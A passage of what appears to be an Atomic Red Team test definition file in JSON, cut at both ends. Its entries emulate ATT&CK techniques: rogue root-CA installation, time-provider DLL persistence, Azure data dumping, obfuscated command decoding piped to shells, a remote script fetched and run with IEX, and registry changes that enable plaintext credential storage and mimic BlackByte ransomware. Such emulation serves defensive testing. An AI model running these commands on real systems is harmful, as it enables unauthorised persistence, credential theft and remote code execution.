			"cleanup_command": "rm /usr/local/share/certs/#{cert_filename}\ncertctl rehash\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Install root CA on Debian/Ubuntu",
		"auto_generated_guid": "53bcf8a0-1549-4b85-b919-010c56d724ff",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"cert_filename": {
				"description": "CA file name",
				"type": "path",
				"default": "rootCA.crt"
			},
			"key_filename": {
				"description": "Key we create that is used to create the CA certificate",
				"type": "path",
				"default": "rootCA.key"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify the certificate exists. It generates if not on disk.\n",
				"prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
			}
		],
		"executor": {
			"command": "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Install root CA on macOS",
		"auto_generated_guid": "cc4a0b8c-426f-40ff-9426-4e10e5bf4c49",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"cert_filename": {
				"description": "CA file name",
				"type": "path",
				"default": "rootCA.crt"
			},
			"key_filename": {
				"description": "Key we create that is used to create the CA certificate",
				"type": "path",
				"default": "rootCA.key"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify the certificate exists. It generates if not on disk.\n",
				"prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
			}
		],
		"executor": {
			"command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Install root CA on Windows",
		"auto_generated_guid": "76f49d86-5eb1-461a-a032-a480f86652f1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pfx_path": {
				"description": "Path of the certificate",
				"type": "path",
				"default": "rootCA.cer"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Verify the certificate exists. It generates if not on disk.\n",
				"prereq_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"
			}
		],
		"executor": {
			"command": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n",
			"cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Install root CA on Windows with certutil",
		"auto_generated_guid": "5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pfx_path": {
				"description": "Path of the certificate",
				"type": "path",
				"default": "$env:Temp\\rootCA2.cer"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Certificate must exist at specified location (#{pfx_path})\n",
				"prereq_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"
			}
		],
		"executor": {
			"command": "certutil -addstore my #{pfx_path}\n",
			"cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Add Root Certificate to CurrentUser Certificate Store",
		"auto_generated_guid": "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n",
			"cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create a new time provider",
		"auto_generated_guid": "df1efab7-bc6d-4b88-8be9-91f55ae017aa",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
			"cleanup_command": "net stop w32time\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Edit an existing time provider",
		"auto_generated_guid": "29e0afca-8d1d-471a-8d34-25512fc48315",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
			"cleanup_command": "net stop w32time\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f\nrm -force C:\\Users\\Public\\AtomicTest.dll\nnet start w32time\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure - Dump Subscription Data with MicroBurst",
		"auto_generated_guid": "1e40bb1d-195e-401e-a86b-c192f55e005c",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "T1082Az"
			},
			"output_directory": {
				"description": "Directory to output results to",
				"type": "string",
				"default": "$env:temp\\T1526Test1"
			},
			"subscription_name": {
				"description": "Azure subscription name to scan",
				"type": "string",
				"default": null
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The Get-AzDomainInfo script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n"
			},
			{
				"description": "The Az module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name Az -Force\n"
			}
		],
		"executor": {
			"command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder #{output_directory} -subscription \"#{subscription_name}\" -verbose\n",
			"cleanup_command": "remove-item #{output_directory} -recurse -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1526",
		"phases": ["discovery"]
	},
	{
		"name": "Deobfuscate/Decode Files Or Information",
		"auto_generated_guid": "dc6fe391-69e6-4506-bd06-ea5eeb4082f8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable": {
				"description": "name of executable",
				"type": "path",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "certutil -encode #{executable} %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n",
			"cleanup_command": "del %temp%\\T1140_calc.txt >nul 2>&1\ndel %temp%\\T1140_calc_decoded.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Certutil Rename and Decode",
		"auto_generated_guid": "71abc534-3c05-4d0c-80f7-cbe93cb2aa94",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable": {
				"description": "name of executable/file to decode",
				"type": "path",
				"default": "C:\\Windows\\System32\\calc.exe"
			}
		},
		"executor": {
			"command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n",
			"cleanup_command": "del %temp%\\tcm.tmp >nul 2>&1\ndel %temp%\\T1140_calc2.txt >nul 2>&1\ndel %temp%\\T1140_calc2_decoded.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Base64 decoding with Python",
		"auto_generated_guid": "356dc0e8-684f-4428-bb94-9313998ad608",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"message": {
				"description": "Message to print to the screen",
				"type": "string",
				"default": "Hello from Atomic Red Team test T1140!"
			},
			"encoded_file": {
				"description": "File to temporarily save encoded text",
				"type": "path",
				"default": "/tmp/T1140.encoded"
			}
		},
		"dependencies": [
			{
				"description": "Python must be present\n",
				"prereq_command": "which python3\n",
				"get_prereq_command": "echo \"Please install Python 3\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Base64 decoding with Perl",
		"auto_generated_guid": "6604d964-b9f6-4d4b-8ce8-499829a14d0a",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"message": {
				"description": "Message to print to the screen",
				"type": "string",
				"default": "Hello from Atomic Red Team test T1140!"
			},
			"encoded_file": {
				"description": "File to temporarily save encoded text",
				"type": "path",
				"default": "/tmp/T1140.encoded"
			}
		},
		"dependencies": [
			{
				"description": "Perl must be present\n",
				"prereq_command": "which perl\n",
				"get_prereq_command": "echo \"Please install Perl\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Base64 decoding with shell utilities",
		"auto_generated_guid": "b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"message": {
				"description": "Message to print to the screen",
				"type": "string",
				"default": "Hello from Atomic Red Team test T1140!"
			},
			"encoded_file": {
				"description": "File to temporarily save encoded text",
				"type": "path",
				"default": "/tmp/T1140.encoded"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "ENCODED=$(echo '#{message}' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > #{encoded_file} && base64 -d #{encoded_file}\necho $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Base64 decoding with shell utilities (freebsd)",
		"auto_generated_guid": "b6097712-c42e-4174-b8f2-4b1e1a5bbb3d",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"message": {
				"description": "Message to print to the screen",
				"type": "string",
				"default": "Hello from Atomic Red Team test T1140!"
			},
			"encoded_file": {
				"description": "File to temporarily save encoded text",
				"type": "path",
				"default": "/tmp/T1140.encoded"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "ENCODED=$(echo '#{message}' | b64encode -r -)\nprintf $ENCODED | b64decode -r\necho $ENCODED | b64decode -r\necho $(echo $ENCODED) | b64decode -r\necho $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}\necho $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "FreeBSD b64encode Shebang in CLI",
		"auto_generated_guid": "18ee2002-66e8-4518-87c5-c0ec9c8299ac",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"bash_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
			},
			"dash_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
			},
			"fish_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
			},
			"sh_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"
			}
		},
		"dependencies": [
			{
				"description": "b64decode must be present\n",
				"prereq_command": "which b64decode\n",
				"get_prereq_command": "echo \"please install b64decode\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo #{bash_encoded} | b64decode -r | sh\necho #{dash_encoded} | b64decode -r | sh\necho #{fish_encoded} | b64decode -r | sh\necho #{sh_encoded} | b64decode -r | sh\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Hex decoding with shell utilities",
		"auto_generated_guid": "005943f9-8dd5-4349-8b46-0313c0a9f973",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"message": {
				"description": "Message to print to the screen",
				"type": "string",
				"default": "Hello from Atomic Red Team test T1140!"
			},
			"encoded_file": {
				"description": "File to temporarily save encoded text",
				"type": "path",
				"default": "/tmp/T1140.encoded"
			}
		},
		"dependencies": [
			{
				"description": "xxd must be present\n",
				"prereq_command": "which xxd\n",
				"get_prereq_command": "echo \"Please install xxd\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "ENCODED=$(echo '#{message}' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Linux Base64 Encoded Shebang in CLI",
		"auto_generated_guid": "3a15c372-67c1-4430-ac8e-ec06d641ce4d",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"bash_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
			},
			"dash_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
			},
			"fish_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
			},
			"sh_encoded": {
				"description": "Encoded",
				"type": "string",
				"default": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"
			}
		},
		"dependencies": [
			{
				"description": "base64 must be present\n",
				"prereq_command": "which base64\n",
				"get_prereq_command": "echo \"please install base64\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo #{bash_encoded} | base64 -d | bash\necho #{dash_encoded} | base64 -d | bash\necho #{fish_encoded} | base64 -d | bash\necho #{sh_encoded} | base64 -d | bash\n"
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "XOR decoding and command execution using Python",
		"auto_generated_guid": "c3b65cd5-ee51-4e98-b6a3-6cbdec138efc",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"xor_key": {
				"description": "Key used to decrypt the command ",
				"type": "string",
				"default": "waEHleblxiQjoxFJQaIMLdHKz"
			},
			"encrypted_command": {
				"description": "Encrypted command that will be executed",
				"type": "string",
				"default": "AAkqKQEM"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Python3 must be installed",
				"prereq_command": "which python3",
				"get_prereq_command": "echo \"Install Python3\""
			}
		],
		"executor": {
			"command": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"#{encrypted_command}\"; key = \"#{xor_key}\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",
			"cleanup_command": null,
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1140",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify Registry of Current User Profile - cmd",
		"auto_generated_guid": "1324796b-d0f6-455a-b4ae-21ffee6aa6b9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n",
			"cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify Registry of Local Machine - cmd",
		"auto_generated_guid": "282f929a-6bc5-42b8-bd93-960c3ba35afe",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"new_executable": {
				"description": "New executable to run on startup instead of Windows Defender",
				"type": "string",
				"default": "calc.exe"
			}
		},
		"executor": {
			"command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n",
			"cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify registry to store logon credentials",
		"auto_generated_guid": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Use Powershell to Modify registry to store logon credentials",
		"auto_generated_guid": "68254a85-aa42-4312-a695-38b7276307f8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore\n",
			"cleanup_command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Add domain to Trusted sites Zone",
		"auto_generated_guid": "cf447677-5a4e-4937-a82c-e47d254afd57",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"bad_domain": {
				"description": "Domain to add to trusted site zone",
				"type": "string",
				"default": "bad-domain.com"
			}
		},
		"executor": {
			"command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n",
			"cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Javascript in registry",
		"auto_generated_guid": "15f44ea9-4571-4837-be9e-802431a7bfae",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n",
			"cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Change Powershell Execution Policy to Bypass",
		"auto_generated_guid": "f3a6cceb-06c9-48e5-8df8-8867a6814245",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"default_execution_policy": {
				"description": "Specify the default poweshell execution policy",
				"type": "string",
				"default": "Default"
			}
		},
		"executor": {
			"command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n",
			"cleanup_command": "try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "BlackByte Ransomware Registry Changes - CMD",
		"auto_generated_guid": "4f4e2f9f-6209-4fcf-9b15-3b7455706f5b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "BlackByte Ransomware Registry Changes - Powershell",
		"auto_generated_guid": "0b79c06f-c788-44a2-8630-d69051f1123d",
		"supported_platforms": ["windows"],
		"executor": {
